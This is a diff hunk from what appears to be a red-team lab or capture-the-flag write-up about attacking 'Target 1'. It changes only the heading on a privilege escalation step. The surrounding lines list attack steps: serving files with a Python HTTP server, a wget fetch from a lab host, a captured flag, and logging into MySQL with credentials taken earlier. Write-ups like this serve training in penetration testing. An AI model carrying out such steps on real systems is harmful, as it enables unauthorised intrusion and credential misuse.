@@ -169,7 +169,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - python -m SimpleHTTPServer 8080 
   - wget http://192.168.1.115/flag3 
 
-  - priveledge escalation
+ ###- priveledge escalation
    - `flag4{df2bc5e951d91581467bb9a2a8ff4425}`
    - `signed into mysql with credentials from last activity`
    - `enumerated the mysql for version number`
